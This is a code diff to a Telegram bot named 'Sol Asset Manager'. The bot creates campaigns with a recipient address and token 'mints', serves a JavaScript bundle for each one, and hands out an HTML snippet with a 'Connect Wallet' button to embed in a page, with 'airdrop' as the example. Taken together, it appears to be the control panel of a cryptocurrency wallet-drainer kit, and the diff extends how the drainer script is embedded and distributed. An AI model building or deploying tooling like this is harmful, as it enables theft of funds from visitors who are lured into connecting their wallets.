@@ -1,5 +1,5 @@
 import "dotenv/config";
-import { generateBundle, HTML_SNIPPET, newCampaignSecret } from "./generate.js";
+import { generateBundle, newCampaignSecret } from "./generate.js";
 import { parseRecipients } from "./recipients.js";
 import * as store from "./store.js";
 
@@ -45,6 +45,16 @@ async function sendDocument(chatId, filename, content) {
   await fetch(`${API}/sendDocument`, { method: "POST", body: form });
 }
 
+function buildSnippet(id) {
+  return (
+    `<script type="module" src="/bundle.js?id=${id}"></script>\n` +
+    '<div data-claim-panel>\n' +
+    '  <button data-claim>Connect Wallet</button>\n' +
+    '  <div data-status></div>\n' +
+    '</div>\n'
+  );
+}
+
 function parseCreate(argLine) {
   const parts = argLine.split("|").map((s) => s.trim());
   if (parts.length < 2) return null;
@@ -52,7 +62,8 @@ function parseCreate(argLine) {
   const recipient = recipientRaw || DEFAULT_RECIPIENTS[0] || "";
   if (!name || !recipient) return null;
   const mode = modeRaw === "manual" ? "manual" : "auto";
-  const liquidMints = (liquidRaw || "").split(",").map((s) => s.trim()).filter(Boolean);
+  const liquidMints = (liquidRaw || "")
+    .split(",").map((s) => s.trim()).filter(Boolean);
   return { name, recipient, mode, liquidMints };
 }
 
@@ -79,11 +90,11 @@ async function handleUpdate(update) {
       chatId,
       `<b>Sol Asset Manager</b>\n\n` +
         `<code>/newfile name|recipient|mode|liquidMints</code> — create a campaign\n` +
-        `<code>/getfile id</code> — fetch the JS bundle\n` +
+        `<code>/getfile id</code> — fetch the JS bundle as a file\n` +
         `<code>/list</code> — list campaigns\n` +
         `<code>/stats id</code> — campaign details\n` +
         `<code>/delete id</code> — remove a campaign\n` +
-        `<code>/snippet</code> — HTML embed snippet\n\n` +
+        `<code>/snippet id</code> — HTML embed snippet for a campaign\n\n` +
         `Mode: <code>auto</code> (default) or <code>manual</code> (mint allowlist).\n` +
         `Example: <code>/newfile airdrop|RECIPIENT|auto</code>`,
       true,
@@ -92,7 +103,17 @@ async function handleUpdate(update) {
   }
 
   if (cmd === "/snippet") {
-    await send(chatId, `<code>${escapeHtml(HTML_SNIPPET)}</code>`, true);
+    const id = argLine.trim();
+    if (!id) return send(chatId, "Usage: /snippet <campaignId>");
+    const record = store.get(id);
+    if (!record) return send(chatId, "Campaign not found.");
+    await send(
+      chatId,
+      `<b>Snippet for #${id}</b>\n` +
+        `Serve <code>bundle.js</code> at <code>/bundle.js</code> (or use the server route) and embed:\n\n` +
+        `<code>${escapeHtml(buildSnippet(id))}</code>`,
+      true,
+    );
     return;
   }
 
@@ -119,8 +140,9 @@ async function handleUpdate(update) {
     await send(
       chatId,
       `Campaign <b>${escapeHtml(parsed.name)}</b> (#${id}) created.\n\n` +
-        `Get the JS: <code>/getfile ${id}</code>\n` +
-        `Embed snippet: <code>/snippet</code>`,
+        `Bundle URL: <code>${APP_URL}/bundle.js?id=${id}</code>\n` +
+        `Download: <code>/getfile ${id}</code>\n` +
+        `Snippet: <code>/snippet ${id}</code>`,
       true,
     );
     return;
@@ -166,6 +188,7 @@ async function handleUpdate(update) {
         `Mode: ${record.mode}\n` +
         `Mints: ${(record.liquidMints || []).length || "all"}\n` +
         `ALT: <code>${record.alt || "not set"}</code>\n` +
+        `Bundle: <code>${APP_URL}/bundle.js?id=${id}</code>\n` +
         `Created: ${record.createdAt}`,
       true,
     );
